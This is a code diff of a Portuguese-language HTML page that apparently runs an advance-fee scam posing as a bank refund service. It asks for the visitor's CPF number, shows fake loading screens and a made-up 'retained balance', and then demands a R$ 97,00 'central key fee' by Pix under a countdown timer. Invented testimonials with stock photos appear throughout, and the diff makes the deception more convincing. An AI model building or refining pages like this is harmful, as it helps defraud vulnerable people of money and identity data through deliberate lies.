@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Protocolo de Reembolso Bancário - Ativo</title>
+    <title>Protocolo de Reembolso Bancário</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700;900&display=swap" rel="stylesheet">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -14,7 +14,6 @@
         .page { display: none; padding: 20px; }
         .page.active { display: block; }
         
-        /* Popup Online no topo sem cobrir nada */
         .online-tag { background: #000; color: #00ff00; text-align: center; font-size: 10px; padding: 5px; font-weight: bold; }
 
         .btn-pulse { background: #28a745; color: white; font-size: 22px; font-weight: 900; padding: 20px; border-radius: 10px; text-align: center; display: block; width: 100%; animation: grow 1.5s infinite alternate; text-transform: uppercase; border: none; cursor: pointer; }
@@ -23,11 +22,11 @@
         .loading-circle { border: 8px solid #f3f3f3; border-top: 8px solid #28a745; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        /* Estilo original dos comentários que você mandou */
-        .comment-box { border-top: 1px solid #eee; padding: 15px 0; }
+        .comment-item { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+        .comment-item img { width: 45px; height: 45px; border-radius: 50%; }
         .comment-name { color: #385898; font-weight: bold; font-size: 14px; }
-        .comment-text { font-size: 15px; color: #1c1e21; margin: 4px 0; }
-        .comment-meta { font-size: 12px; color: #90949c; }
+        .comment-text { font-size: 15px; color: #1c1e21; }
+        .comment-meta { font-size: 12px; color: #90949c; margin-top: 3px; }
     </style>
 </head>
 <body>
@@ -57,30 +56,31 @@
             <div class="mt-10">
                 <p class="font-bold border-b pb-2 mb-4">208 Comentários</p>
                 
-                <div class="comment-box">
-                    <p class="comment-name">Fernando Souza</p>
-                    <p class="comment-text">Cara, eu tô tremendo... fiz no app do Nubank e apareceu R$ 990,00 que eu nem sabia que tinha.</p>
-                    <p class="comment-meta">Curtir · Responder · 2 min</p>
+                <div class="comment-item">
+                    <img src="https://randomuser.me/api/portraits/men/32.jpg">
+                    <div>
+                        <p class="comment-name">Fernando Souza</p>
+                        <p class="comment-text">Cara, eu tô tremendo... fiz no app do Nubank e apareceu R$ 990,00 que eu nem sabia que tinha.</p>
+                        <p class="comment-meta">Curtir · Responder · 2 min</p>
+                    </div>
                 </div>
-                <div class="comment-box">
-                    <p class="comment-name">Mariana Cavalcante de Oliveira</p>
-                    <p class="comment-text">O Roberto é um anjo. Consegui pagar minha conta de luz atrasada com esse saldo.</p>
-                    <p class="comment-meta">Curtir · Responder · 5 min</p>
+
+                <div class="comment-item">
+                    <img src="https://randomuser.me/api/portraits/women/44.jpg">
+                    <div>
+                        <p class="comment-name">Mariana Cavalcante de Oliveira</p>
+                        <p class="comment-text">O Roberto é um anjo. Consegui pagar minha conta de luz atrasada com esse saldo.</p>
+                        <p class="comment-meta">Curtir · Responder · 5 min</p>
+                    </div>
                 </div>
-                <div class="comment-box">
-                    <p class="comment-name">Marcos Pimentel Junior</p>
-                    <p class="comment-text">Recuperei 1400 reais. O banco come nosso dinheiro todo dia e a gente nem vê.</p>
-                    <p class="comment-meta">Curtir · Responder · 8 min</p>
-                </div>
-                <div class="comment-box">
-                    <p class="comment-name">Carla Dias Camargo</p>
-                    <p class="comment-text">Funcionou aqui no Bradesco! No começo achei estranho mas o valor caiu certinho.</p>
-                    <p class="comment-meta">Curtir · Responder · 12 min</p>
-                </div>
-                <div class="comment-box">
-                    <p class="comment-name">João Paulo Medeiros</p>
-                    <p class="comment-text">Fiz a consulta e liberou 2100. Paguei a taxa da chave e caiu na hora. Valeu demais!</p>
-                    <p class="comment-meta">Curtir · Responder · 15 min</p>
+
+                <div class="comment-item">
+                    <img src="https://randomuser.me/api/portraits/men/12.jpg">
+                    <div>
+                        <p class="comment-name">Marcos Pimentel Junior</p>
+                        <p class="comment-text">Recuperei 1400 reais. O banco come nosso dinheiro todo dia e a gente nem vê.</p>
+                        <p class="comment-meta">Curtir · Responder · 8 min</p>
+                    </div>
                 </div>
             </div>
         </div>
@@ -88,7 +88,7 @@
         <div id="p2" class="page">
             <h2 class="text-xl font-black text-center mb-8 uppercase italic">Consulta de Saldo Retido</h2>
             <input type="tel" id="cpf_user" oninput="mask(this, '###.###.###-##')" class="w-full p-5 bg-gray-100 rounded-lg outline-none font-bold text-center text-xl mb-6" placeholder="000.000.000-00">
-            <button onclick="loader(3, 4, 'Consultando base de dados...')" class="btn-pulse">VERIFICAR AGORA</button>
+            <button onclick="loader(3, 4, 'Buscando dados no servidor central...', 3000)" class="btn-pulse">CONSULTAR VALOR</button>
         </div>
 
         <div id="p3" class="page text-center py-20">
@@ -99,60 +99,65 @@
         <div id="p4" class="page text-center">
             <h2 class="text-3xl font-black text-green-600 mb-6 uppercase">Valor Localizado!</h2>
             <div class="bg-gray-900 text-white p-10 rounded-2xl mb-8">
-                <p class="text-xs font-bold text-gray-400 uppercase mb-2">Saldo Protocolo 892</p>
+                <p class="text-xs font-bold text-gray-400 uppercase mb-2">Saldo Disponível</p>
                 <p class="text-5xl font-black">R$ <span id="rand_val">0,00</span></p>
             </div>
             <button onclick="nextPage(5)" class="btn-pulse">GERAR CHAVE DE SAQUE</button>
         </div>
 
         <div id="p5" class="page text-center">
-            <h2 class="text-xl font-black mb-6">SELECIONE SEU BANCO</h2>
-            <div class="grid grid-cols-2 gap-3 mb-8">
-                <div onclick="sel(this)" class="p-4 border-2 rounded-lg font-bold cursor-pointer">NUBANK</div>
-                <div onclick="sel(this)" class="p-4 border-2 rounded-lg font-bold cursor-pointer">ITAÚ</div>
-                <div onclick="sel(this)" class="p-4 border-2 rounded-lg font-bold cursor-pointer">CAIXA</div>
-                <div onclick="sel(this)" class="p-4 border-2 rounded-lg font-bold cursor-pointer">INTER</div>
+            <h2 class="text-xl font-black mb-6 uppercase">Selecione seu Banco</h2>
+            <div class="grid grid-cols-2 gap-2 mb-8">
+                <div onclick="sel(this)" class="p-3 border-2 rounded font-bold cursor-pointer text-sm">ITAÚ</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded font-bold cursor-pointer text-sm">BRADESCO</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded font-bold cursor-pointer text-sm">CAIXA</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded font-bold cursor-pointer text-sm">SANTANDER</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded font-bold cursor-pointer text-sm">BANCO DO BRASIL</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded font-bold cursor-pointer text-sm">NUBANK</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded font-bold cursor-pointer text-sm">INTER</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded font-bold cursor-pointer text-sm">C6 BANK</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded font-bold cursor-pointer text-sm">PAGBANK</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded font-bold cursor-pointer text-sm">PICPAY</div>
             </div>
-            <button onclick="loader(6, 7, 'Gerando e Criptografando Chave...')" class="btn-pulse">CONFIRMAR</button>
+            <button onclick="loader(6, 7, 'Gerando chave criptografada...', 4000)" class="btn-pulse">CONFIRMAR BANCO</button>
         </div>
 
         <div id="p6" class="page text-center py-20">
             <div class="loading-circle"></div>
-            <h3 class="text-lg font-bold">Validando no seu banco...</h3>
+            <h3 class="text-lg font-bold">Autenticando com o Banco...</h3>
         </div>
 
         <div id="p7" class="page text-center">
-            <h2 class="text-xl font-black mb-6 uppercase">Chave Gerada</h2>
+            <h2 class="text-xl font-black mb-6 uppercase italic">Chave de Saque Gerada</h2>
             <div class="bg-gray-100 p-6 text-2xl font-mono font-black border-2 border-dashed border-gray-400 mb-8">892-TX-2026</div>
-            <button onclick="finalLoader()" class="btn-pulse">ATIVAR E RECEBER PIX</button>
+            <button onclick="finalLoader()" class="btn-pulse">ATIVAR CHAVE E SACAR</button>
         </div>
 
         <div id="p8" class="page text-center py-20">
             <div class="loading-circle" style="border-top-color:#c00"></div>
             <p class="text-5xl font-black" id="final-pct">0%</p>
-            <h3 class="text-lg font-bold mt-4" id="status-f">Ativando Chave...</h3>
+            <h3 class="text-lg font-bold mt-4" id="status-f">Integrando ao Banco...</h3>
         </div>
 
         <div id="p9" class="page text-center">
             <div class="border-t-8 border-red-600 p-6 shadow-xl">
-                <h3 class="text-2xl font-black text-red-600 mb-4">TRANSFERÊNCIA BLOQUEADA</h3>
-                <p class="text-sm mb-6">Pague a <b>Taxa de Chave Central (TAC)</b> para liberar seu saldo imediatamente.</p>
+                <h3 class="text-2xl font-black text-red-600 mb-4 uppercase">Erro de Ativação</h3>
+                <p class="text-sm mb-6">A chave central exige o pagamento da <b>Taxa de Chave Central (TAC)</b> para liberar valores acima de R$ 2.500,00.</p>
                 <div class="bg-gray-100 p-6 rounded-xl mb-6">
                     <p class="text-4xl font-black">R$ 97,00</p>
                 </div>
-                <button onclick="nextPage(10)" class="btn-pulse" style="background:#c00">LIBERAR MEU PIX</button>
+                <button onclick="nextPage(10)" class="btn-pulse" style="background:#c00">ATIVAR CHAVE AGORA</button>
             </div>
         </div>
 
         <div id="p10" class="page">
-            <h2 class="text-xl font-black text-center mb-2 uppercase">Finalize a ativação</h2>
-            <p class="text-center text-sm text-gray-500 mb-6">Ative no seu banco para gerar seu saque.</p>
-            
+            <h2 class="text-xl font-black text-center mb-2 uppercase italic">Finalize a ativação da sua chave</h2>
+            <p class="text-center text-sm text-gray-500 mb-6 italic">Ative no seu banco para gerar seu saque</p>
             <div class="border p-6 rounded-xl text-center bg-gray-50">
-                <p class="text-red-600 font-bold mb-2">A CHAVE EXPIRA EM: <span id="timer">05:00</span></p>
-                <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=CHAVE_PIX_AQUI" class="mx-auto mb-4">
+                <p class="text-red-600 font-bold mb-4">EXPIRA EM: <span id="timer">05:00</span></p>
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=CHAVE_PIX_ESTATICA" class="mx-auto mb-4 border-4 border-white shadow">
                 <button onclick="alert('Copiado!')" class="w-full bg-blue-600 text-white font-black py-4 rounded-lg mb-4">COPIA E COLA PIX</button>
-                <p class="text-[10px] text-gray-400">Ativação processada via Protocolo Bancário Criptografado v8.9.2</p>
+                <p class="text-[10px] text-gray-400 uppercase font-bold">Ativação processada pelo protocolo CriptoBancário 892</p>
             </div>
         </div>
 
@@ -170,10 +175,10 @@
             if(n === 10) startTimer();
         }
 
-        function loader(curr, next, text) {
+        function loader(curr, next, text, time) {
             nextPage(curr);
             document.getElementById('load-text').innerText = text;
-            setTimeout(() => nextPage(next), 2000);
+            setTimeout(() => nextPage(next), time);
         }
 
         function finalLoader() {
@@ -182,8 +187,8 @@
             let t = setInterval(() => {
                 p++;
                 document.getElementById('final-pct').innerText = p + "%";
-                if(p >= 99) { clearInterval(t); setTimeout(() => nextPage(9), 1000); }
-            }, 50);
+                if(p >= 99) { clearInterval(t); setTimeout(() => nextPage(9), 2000); }
+            }, 70);
         }
 
         function startTimer() {
@@ -206,8 +211,8 @@
         }
 
         function sel(el) {
-            document.querySelectorAll('#p5 div').forEach(d => d.style.borderColor = "#ddd");
-            el.style.borderColor = "#28a745";
+            document.querySelectorAll('#p5 div').forEach(d => { d.style.borderColor = "#ddd"; d.style.backgroundColor = "transparent"; });
+            el.style.borderColor = "#28a745"; el.style.backgroundColor = "#e8f5e9";
         }
 
         setInterval(() => {
